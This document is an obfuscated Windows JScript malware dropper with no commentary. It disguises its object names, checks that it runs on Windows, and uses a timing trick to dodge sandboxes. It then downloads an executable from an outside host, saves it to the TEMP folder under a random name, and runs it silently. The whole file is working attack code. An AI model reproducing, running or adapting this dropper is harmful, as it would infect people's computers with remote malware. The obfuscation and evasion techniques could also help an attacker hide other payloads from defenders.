var _I0 = false;
var _ZS = "CreateObject";
var _N0 = function _PV() {return WScript[_ZS]("WScript"+".Shell");}(), _FP = 11;
var _WC = "MSXML2.XMLHTTP";
var _PQ = 2123213;
var _T = 0;
function _O(_GI){_N0["Run"](_GI, _T, _T);};
function _N(){return _WC + "";};
function _Y(_XQ, _HO){_T = _T * 1; return _XQ - _HO;};
function _CW(){return _ZS;};
/*@cc_on
  @if (@_win32 || @_win64)
    _I0 = true;
  @end
@*/
if (_I0)
{
var _V = "";
function _JW(){return 22;};
var _D = 0; var _EI = 0;
function _X()
{
var _C = new this["Date"]();
var _YP = _C["getUTCMilliseconds"]();
WScript["Sleep"](_JW());
var _C = new this["Date"]();
var _G = _C["getUTCMilliseconds"]();
WScript["Sleep"](_JW());
var _C = new this["Date"]();
var _SR = _C["getUTCMilliseconds"]();
var _D = "_R";
_D = _Y(_G, _YP);
var _EI = "_OJ";
_EI = _Y(_SR, _G);
_V = "open";
return _Y(_D, _EI);
}
var _E = false;
var _Z = false;
for (var _XA = _T; _XA < _JW() * 1; _XA++){if (_X() != _T){
_E = true; 
_EI = "31" + 11 * _D + _EI; 
_Z = true; 
break;
}}
function _MR() {return ((_E == true) && (_E == _Z)) ? 1 : _T;};
if (_E && _MR() && _Z){
function _H() {return _N0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "zKS5Rnn87qAceX.ex" + "e";};
 _NU = _N();
 _WQ = WScript[_ZS](_NU);
 var _V0 = 1;
 while (_V0){
try {
	if (_V0 == 1)
	{
		_WQ[_V]("GET", "http://itead-europe.com/k3ias", false);
		_WQ["send"]();
		_I = "Sleep";
	}
	WScript[_I](_JW() + 120); 
	if (_WQ["readystate"] < 2 * 2) continue;
	_V0 = _T;
	function _A(_QJ) {var _H0 = (1, 2, 3, 4, 5, _QJ); return _H0;};
	_S0 = WScript[_CW()]("ADODB.Stream");
	_NU = _S0;
	_NU[_V]();
	_NU["type"] = _A(1);
	_NU["write"](_WQ["ResponseBody"]);
	_S0["position"] = _A(_T);
	_NU["Save" + "ToFile"](_H(), 2);
	_S0["cl"+"ose"]();
	_S = _H();
	_O(_S);
} catch(_JS){};
}
}
}

